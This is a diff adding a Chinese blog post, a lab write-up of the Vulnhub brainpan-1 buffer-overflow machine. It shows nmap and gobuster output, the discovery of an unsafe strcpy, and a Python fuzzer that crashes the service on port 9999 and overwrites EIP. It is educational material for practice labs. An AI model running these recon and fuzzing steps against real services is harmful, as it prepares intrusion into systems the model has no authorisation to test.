@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="缓冲区溢出的靶机，同样也是类OSCP机器。靶机下载地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-brainpan-1(缓冲区溢出)">
+<meta property="og:url" content="http://atsud0.me/2020/06/25/Vulnhub-brainpan-1/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="缓冲区溢出的靶机，同样也是类OSCP机器。靶机下载地址">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112338.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112823.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112546.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112610.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112734.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_113047.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_113141.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_113513.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_114155.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_115401.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_120156.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_121247.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_122304.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_122548.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_123259.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_123943.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_125428.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_125802.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_131641.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_132617.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_132838.jpg">
+<meta property="article:published_time" content="2020-06-25T05:37:08.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.456Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Buffer Overflow">
+<meta property="article:tag" content="GTFOBins-man">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200625_112338.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/06/25/Vulnhub-brainpan-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Vulnhub-brainpan-1(缓冲区溢出) | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/06/25/Vulnhub-brainpan-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-brainpan-1(缓冲区溢出)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-06-25 13:37:08" itemprop="dateCreated datePublished" datetime="2020-06-25T13:37:08+08:00">2020-06-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>12 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>缓冲区溢出的靶机，同样也是类OSCP机器。<br><a href="https://www.vulnhub.com/entry/brainpan-1,51/" target="_blank" rel="noopener">靶机下载地址</a></p>
+<a id="more"></a>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-06-24 23:17 EDT</span><br><span class="line">Nmap scan report for 192.168.56.4</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999&#x2F;tcp  open  abyss?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _| _| </span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| </span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">|_    ENTER THE PASSWORD</span><br><span class="line">10000&#x2F;tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9999-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;6&#x2F;24%Time&#x3D;5EF41741%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x</span><br><span class="line">SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</span><br><span class="line">SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</span><br><span class="line">SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|</span><br><span class="line">SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</span><br><span class="line">SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</span><br><span class="line">SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x</span><br><span class="line">SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_</span><br><span class="line">SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x</span><br><span class="line">SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x</span><br><span class="line">SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 47.28 seconds</span><br></pre></td></tr></table></figure>
+
+<p>只开放了两个端口。</p>
+<ul>
+<li>10000-http python的simplehttpserver</li>
+<li>9999 Unknow</li>
+</ul>
+<p>9999<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112338.jpg" alt=""></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112823.jpg" alt=""></p>
+<p>10000<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112546.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112610.jpg" alt=""></p>
+<p>什么都没有的样子，进行目录探测。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.56.4:10000&#x2F;&quot; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;192.168.56.4:10000&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;06&#x2F;24 23:25:03 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;$</span><br><span class="line">&#x2F;bin (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;06&#x2F;24 23:25:18 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>在bin目录下发现一个exe程序。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112734.jpg" alt=""></p>
+<p>将其下载下来。我放在了win xp上面运行了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113047.jpg" alt=""></p>
+<p>对测试机进行nc连接。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113141.jpg" alt=""></p>
+<p>此时如果strings brainpan.exe会发现存在几个危险函数<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113513.jpg" alt=""></p>
+<ul>
+<li>strcpy()<blockquote>
+<p>strcpy()函数将源字符串复制到缓冲区。没有指定要复制字符的具体数目！如果源字符串碰巧来自用户输入，且没有专门限制其大小，则有可能会造成缓冲区溢出</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h3 id="是否存在缓冲区溢出"><a href="#是否存在缓冲区溢出" class="headerlink" title="是否存在缓冲区溢出"></a>是否存在缓冲区溢出</h3><p>接下来进行测试看是否存在缓冲区溢出</p>
+<p>编写一个python脚本来进行模糊测试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span> * counter)</span><br><span class="line">    counter = counter + <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    print(<span class="string">"Fuzzing PASS with &#123;&#125; bytes"</span>.format(len(string)))</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.send(string)</span><br><span class="line">    s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_114155.jpg" alt=""></p>
+<p>当发送600个字符的内容时，程序崩溃。并且EIP和EBP寄存器被’A’填满。证明了程序存在缓冲区溢出。</p>
+<h3 id="计算ESP什么时候会溢出，填满EIP"><a href="#计算ESP什么时候会溢出，填满EIP" class="headerlink" title="计算ESP什么时候会溢出，填满EIP"></a>计算ESP什么时候会溢出，填满EIP</h3><p>使用msf的脚本来生成字符</p>
